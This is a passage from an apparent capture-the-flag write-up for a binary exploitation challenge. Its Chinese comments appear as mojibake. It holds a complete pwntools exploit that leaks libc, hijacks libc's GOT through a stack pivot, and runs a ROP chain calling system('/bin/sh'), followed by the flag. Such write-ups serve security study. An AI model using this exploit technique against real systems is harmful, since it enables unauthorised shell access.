# ç¹¼çºŒ si æ‡‰è©²æœƒçœ‹åˆ°é€™å€‹ï¼Œé€™å€‹ 098 çµå°¾çš„å°±æ˜¯ strlen çš„ GOT address 
# é€™æ¨£å°±èƒ½çŸ¥é“è·Ÿ GOT base address çš„ offset äº†
0x7f9c5eaf7098 *ABS*@got.plt
```

é€™æ™‚å°±èƒ½ä¿®æ”¹ fx3 çš„åƒæ•¸ pos = 16ï¼Œå°±èƒ½å‰›å‰›å¥½è“‹åˆ° 0x7f9c5eaf7098ï¼Œåªè¦ call puts å°±èƒ½é€²å…¥ strlen å†é€²å…¥ system functionï¼Œè§¸ç™¼ ROP get shell äº†




```python
import re
from pwn import *

context.arch='amd64'

p = process('./chal',env={"LD_PRELOAD":"./libc.so.6"})
libc = ELF('./libc.so.6')

# p = remote('10.99.66.3',31337)

base = int(p.readline(),16) - libc.symbols['printf']
libc.address = base
success(hex(base))


class ROPgadget():
    def __init__(self,libc: ELF,base=0):
        if Path("./gadgets").exists():
            print("[!] Using gadgets, make sure that's corresponding to the libc!")
        else:
            fp = open("./gadgets",'wb')
            subprocess.run(f"ROPgadget --binary {libc.path}".split(" "),stdout=fp)
            fp.close()
        fp = open("./gadgets",'rb')
        data = fp.readlines()[2:-2]
        data = [x.strip().split(b" : ") for x in data]
        data = [[int(x[0],16),x[1].decode()] for x in data]
        fp.close()
        self.gadgets = data
        self.base  = base
    def search(self,s):
        for addr,ctx in self.gadgets:
            match = re.search(s, ctx)
            if match:
                return addr+self.base
        return None   
def fx3(libc,pos = 1, rop_chain=[],nudge=0):
    # 
    # nudge to align stack
    assert(pos>=1)
    assert(pos<=36)
    got = libc.address + libc.dynamic_value_by_tag("DT_PLTGOT")
    plt0 = libc.address + libc.get_section_by_name(".plt").header.sh_addr
    rop = ROPgadget(libc,libc.address)
    escape = rop.search(r"^pop rsp .*jmp rax")
    pivot = rop.search(r"^pop rsp ; ret")
    rop_chain += [escape,got+0x3000-nudge*8] 
    rop_len = len(rop_chain)
    if pos <= rop_len:
        # We can shrink it but make it more complex
        payload = flat([got+0x18+pos*8,pivot])+flat([0]*(pos-1))+p64(plt0)+flat(rop_chain)
    else:
        # We can shrink it but make it more complex
        payload = flat([got+0x18,pivot])+flat(rop_chain)+flat([0]*(pos-rop_len))+p64(plt0)
        
    return got+0x08,payload


rop = ROP(libc)
rdi = rop.find_gadget(["pop rdi",'ret'])[0]
rax = rop.find_gadget(["pop rax",'ret'])[0]


rop_chain = [rdi,libc.search(b"/bin/sh").__next__(),rax,libc.sym["system"]]
dest, payload = fx3(libc,16,rop_chain,1) 
success(hex(dest))
success(hex(len(payload)))


p.sendline((hex(dest)))
p.sendline(payload)

p.interactive()
# CGGC{0ne_sh0t_14_4ll_y0u_nEEd!}
```